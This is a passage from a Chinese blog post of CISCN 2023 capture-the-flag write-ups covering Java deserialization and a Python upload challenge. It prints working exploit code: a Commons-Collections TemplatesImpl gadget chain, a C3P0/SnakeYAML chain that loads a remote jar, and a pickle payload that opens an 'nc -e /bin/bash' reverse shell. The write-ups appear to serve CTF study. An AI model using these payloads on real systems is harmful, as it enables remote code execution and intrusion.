        setFieldValue(templates, <span class="hljs-string">"_class"</span>, <span class="hljs-literal">null</span>);
        setFieldValue(templates, <span class="hljs-string">"_bytecodes"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]{bytes});

        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();
        myexpect.setTargetclass(TrAXFilter.class);
        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Templates.class});
        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{templates});

        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();

        <span class="hljs-type">ConstantTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>);
        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span>  <span class="hljs-operator">=</span> LazyMap.decorate(jsonObject,transformer);
        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap , <span class="hljs-string">"Sentiment"</span>);

        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();
        hashMap.put(tiedMapEntry, <span class="hljs-string">"1"</span>);

        jsonObject.remove(<span class="hljs-string">"Sentiment"</span>);
        setFieldValue(transformer,<span class="hljs-string">"iConstant"</span>,myexpect);

        <span class="hljs-type">byte</span>[] serialize = serialize(hashMap);
        System.out.println(Base64.getEncoder().encodeToString(serialize));
        <span class="hljs-comment">//unserialize(serialize);</span>
    }
}</code></pre>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/#deserbug">2023 CISCN 初赛 Web Writeup</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54902210/article/details/130956079">[CISCN 2023]—DeserBug</a></p>
<h1 id="ciscn-2023-西南dataapi">[CISCN 2023 西南]dataapi</h1>
<p>决赛题目，看不懂，发布wp的人也少，留着吧，┭┮﹏┭┮</p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/06/13/ciscn%E8%A5%BF%E5%8D%97%E5%A4%8D%E8%B5%9Bawdp-web/">CISCN西南复赛AWDPlus Web</a></p>
<h1 id="ciscn-2023-华北normal_snake">[CISCN 2023 华北]normal_snake</h1>
<p>又是Java反序列化，看不懂。。。考的是C3P0利用链：EXP如下</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main2</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] data;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">//URLClassLoader</span>
        <span class="hljs-type">C3P0DataSource</span> <span class="hljs-variable">c3P0DataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">C3P0DataSource</span>();

        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase"</span>);
        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();
        declaredConstructor.setAccessible(<span class="hljs-literal">true</span>);
        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">poolBackedDataSourceBase</span> <span class="hljs-operator">=</span> (PoolBackedDataSourceBase)declaredConstructor.newInstance();
        setFieldValue(<span class="hljs-string">"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase"</span>,poolBackedDataSourceBase,<span class="hljs-string">"connectionPoolDataSource"</span>,c3P0DataSource);

        serialize(poolBackedDataSourceBase);
        <span class="hljs-comment">//unserialize();</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">hexAscii</span> <span class="hljs-operator">=</span> ByteUtils.toHexAscii(data);
        System.out.println(hexAscii);
        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">"!&lt;tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&gt; {userOverridesAsString: \"HexAsciiSerializedMap:"</span> +hexAscii+ <span class="hljs-string">";\"}"</span>;
        System.out.println(poc);
        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();
        <span class="hljs-comment">//yaml.load(poc);</span>
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(String className,Object object, String field_name, Object field_value)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(className);
        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(field_name);
        declaredField.setAccessible(<span class="hljs-literal">true</span>);
        declaredField.set(object,field_value);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        <span class="hljs-comment">//string = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span>
        data = byteArrayOutputStream.toByteArray();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">//ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));</span>
        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data);
        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);
        objectInputStream.readObject();
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0DataSource</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException {
        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">"Payload8"</span>,<span class="hljs-string">"Payload8"</span>,<span class="hljs-string">"http://127.0.0.1:5555/payload8.jar"</span>);
        <span class="hljs-comment">//Reference reference = new Reference("Payloadxx","Payloadxx","");</span>
        <span class="hljs-keyword">return</span> reference;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException {

    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException {

    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}</code></pre>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BUTLER/p/17473487.html">2023 华北分区赛 normal_snake</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13279?time__1311=mqmxnDBD9DyDc0iD%2FD0Yx20AqwhOADIOGgbD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-8">记几道CTF-Java反序列化题目</a></p>
<h1 id="ciscn-2023-华北exift0ol">[CISCN 2023 华北]ExifT0ol</h1>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> web
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> exifread

web.config.debug = <span class="hljs-literal">False</span><span class="hljs-comment">#关闭调式模式</span>

<span class="hljs-comment">#定义url路由</span>
urls = (
    <span class="hljs-string">'/'</span>, <span class="hljs-string">'Index'</span>,
    <span class="hljs-string">'/upload'</span>, <span class="hljs-string">'Upload'</span>,
    <span class="hljs-string">'/exifhandler'</span>, <span class="hljs-string">'ExifHandler'</span>
)

app = web.application(urls, <span class="hljs-built_in">locals</span>())  <span class="hljs-comment">#传入了路由映射和locals()作为参数。</span>
render = web.template.render(<span class="hljs-string">'templates/'</span>)<span class="hljs-comment">#用于渲染模板文件</span>
session = web.session.Session(app, web.session.DiskStore(<span class="hljs-string">"sessions"</span>), initializer={<span class="hljs-string">'filename'</span>: <span class="hljs-string">''</span>, <span class="hljs-string">'filedir'</span>: <span class="hljs-string">''</span>, <span class="hljs-string">'exif'</span>: {}})<span class="hljs-comment">#用于存储会话信息，并初始化了filename、filedir和exif三个属性。</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Index</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GET</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> render.upload()<span class="hljs-comment">#显示上传文件的页面</span>


<span class="hljs-keyword">class</span> <span class="hljs-title class_">Upload</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GET</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> render.upload()   <span class="hljs-comment">#显示上传文件的表单</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">self</span>):
        params = web.<span class="hljs-built_in">input</span>(file={})<span class="hljs-comment">#获取上传文件对象</span>
        filedir = <span class="hljs-string">'uploads/'</span><span class="hljs-comment">#设置问文件上传所保存的目录</span>

        <span class="hljs-keyword">if</span> <span class="hljs-string">'file'</span> <span class="hljs-keyword">in</span> params:
            <span class="hljs-comment">#如果请求中包含文件对象'file'，则获取文件名并提取文件后缀</span>
            filename = params[<span class="hljs-string">'file'</span>].filename
            fileext = filename.split(<span class="hljs-string">'.'</span>)[-<span class="hljs-number">1</span>]
            <span class="hljs-comment">#如果不是指定的后缀，则给出警告，但并不会直接return（也就是没影响）</span>
            <span class="hljs-keyword">if</span> fileext.lower() <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">'jpg'</span>, <span class="hljs-string">'jpeg'</span>, <span class="hljs-string">'png'</span>, <span class="hljs-string">'gif'</span>]:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">'Warning: only allow jpg, jpeg, png, gif!'</span>)

            <span class="hljs-comment">#将文件名和文件目录保存到会话的filename和filedir属性中。</span>
            session.filename = filename
            session.filedir = filedir
	
    		<span class="hljs-comment">#打开文件并将文件内容写入到文件中，关闭文件。</span>
            fout = <span class="hljs-built_in">open</span>(filedir + filename, <span class="hljs-string">'wb'</span>)
            fout.write(params[<span class="hljs-string">'file'</span>].value)
            fout.close()
            
            <span class="hljs-keyword">return</span> <span class="hljs-string">"&lt;script&gt;alert('successfully uploaded');window.location.href='/exifhandler'&lt;/script&gt;"</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'no file'</span>


<span class="hljs-keyword">class</span> <span class="hljs-title class_">ExifHandler</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GET</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment">#检查会话中的filename和exif属性是否为空，以确定是否有文件上传和是否已经获取过EXIF信息。</span>
        <span class="hljs-keyword">if</span> session.filename != <span class="hljs-string">''</span> <span class="hljs-keyword">and</span> session.exif == {}:
            <span class="hljs-comment">#打开上传的文件并使用exifread.process_file(f)方法处理文件，将结果保存到tags变量中。</span>
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(session.filedir + session.filename, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
                    tags = exifread.process_file(f)

            exif_info = {}
            <span class="hljs-comment">#遍历tags字典，将以'EXIF'开头的标签和对应的值保存到exif_info字典中。</span>
            <span class="hljs-keyword">for</span> tag, value <span class="hljs-keyword">in</span> tags.items():
                <span class="hljs-keyword">if</span> tag.startswith(<span class="hljs-string">'EXIF'</span>):
                    exif_info[tag] = <span class="hljs-built_in">str</span>(value)

            session.exif = exif_info
<span class="hljs-comment">#将exif_info保存到会话的exif属性中，然后使用render.result方法渲染结果页面，并将filename和exif_info传递给模板进行显示。</span>
            <span class="hljs-keyword">return</span> render.result(filename=session.filename, exif_info=exif_info)
        <span class="hljs-keyword">elif</span> session.filename == <span class="hljs-string">''</span> <span class="hljs-keyword">and</span> session.exif == {}:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"&lt;script&gt;alert('no file uploaded');window.location.href='/'&lt;/script&gt;"</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> render.result(filename=session.filename, exif_info=session.exif)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run()</code></pre>
<p>分了上述代码在结合wp，这道题就是通过上传文件来覆盖session文件，覆盖之后，会自动经过ExifHandler路由进行处理，最终会通过模板渲染回显到页面（应该就是这里会造成漏洞）</p>
<p>既然是session文件，那就得利用反序列化，以序列化数据存入，最终渲染的时候反序列化，执行我们的恶意文件</p>
<p>虽然上述有白名单的检查，但是没有return之类的，只是单纯的警告，因此无用。</p>
<p>由于<code>filename</code>是可控的,而且也没有对其做任何过滤，此处就会有一个任意文件上传漏洞。</p>
<p>先构造payload</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> itsdangerous
<span class="hljs-keyword">import</span> pickle, pickletools
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>():

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.name = <span class="hljs-string">"test"</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">"nc ip port -e /bin/bash"</span>, ))
a = pickletools.optimize((pickle.dumps(test(), <span class="hljs-number">4</span>)))
<span class="hljs-built_in">print</span>(itsdangerous.base64_encode(a))</code></pre>
<p>这里不清楚的点就是为何在构造payload做了那些优化，最后还是编码了一下</p>
<p>将脚本输出内容上传到 <code>sessions</code>目录下的<code>888</code> 的文件中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240303145950542.png" alt="image-20240303145950542"></p>
<p>这里最后没有复现成功。。。真的难受</p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cyyyyi/p/17500269.html">春秋杯春季联赛&amp;&amp;ciscn2023华北赛区部分题解</a></p>
<h1 id="参考文章">参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">SSTI（模板注入）漏洞（入门篇）</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64222098/article/details/130174324">[CISCN 2019华东南]Web11 题解</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11435298.html">刷题记录：[CISCN2019 华北赛区 Day2 Web1]Hack World</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/125244044">[CISCN2019 华北赛区 Day2 Web1]Hack World --BUUCTF</a></p>
<p><a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/02/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shinygod/article/details/124759022">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></p>
<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2022/03/18/187/">CISCN 2019 初赛 Love Math</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11588219.html">刷题记录：[CISCN 2019 初赛]Love Math</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/magic123/articles/17525734.html">[CISCN 2019华东南]Web4</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/107656285">BUUCTF：[CISCN2019 华东南赛区]Web4</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h3zh1/p/12653579.html">[CISCN2019 华东南赛区]Double Secret</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/01/24/ctf-shua-ti-zhi-lu/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/01/24/ctf-shua-ti-zhi-lu/')">CISCN国赛</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/01/24/ctf-shua-ti-zhi-lu/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=CISCN国赛&amp;url=http://hybcx.xyz/2024/01/24/ctf-shua-ti-zhi-lu/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/CTF%E8%B5%9B%E4%BA%8B/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>CTF赛事<span class="tagsPageCount">18</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/10/shen-ru-dvwa/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">重温DVWA</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">常规漏洞学习总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2023/10/22/0xgame-2023/" title="0xGame 2023"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-22</div><div class="title">0xGame 2023</div></div></a></div><div><a href="/2023/10/02/2023shctf/" title="SHCTF 2023-wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-10-02</div><div class="title">SHCTF 2023-wp</div></div></a></div><div><a href="/2024/05/21/ciscn-2024wp/" title="CISCN-2024Wp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-21</div><div class="title">CISCN-2024Wp</div></div></a></div><div><a href="/2023/12/12/ctfhub-xi-lie/" title="CTFHub系列"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2023-12-12</div><div class="title">CTFHub系列</div></div></a></div><div><a href="/2024/07/14/ctf-shua-ti/" title="CTF刷题"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-14</div><div class="title">CTF刷题</div></div></a></div><div><a href="/2024/03/17/fsctf-2023/" title="FSCTF 2023"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-03-17</div><div class="title">FSCTF 2023</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div 